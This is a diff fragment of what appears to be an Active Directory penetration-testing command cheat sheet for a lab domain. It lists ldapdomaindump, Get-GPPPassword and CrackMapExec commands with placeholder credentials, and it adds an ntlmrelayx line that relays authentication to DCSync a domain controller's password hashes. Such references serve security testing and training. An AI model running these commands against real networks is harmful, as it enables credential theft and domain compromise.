@@ -281,4 +281,5 @@ ldapdomaindump --user 'breaking.bad\someuser' --password 'somepassword' --outdir
 Get-GPPPassword -debug -no-pass dc01.breaking.bad
 cme smb --list-modules
 cme ldap dc01.breaking.bad -d breaking.bad -u someuser -p somepassword -M maq
+ntlmrelayx -t dcsync://dc02.breaking.bad -smb2support
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
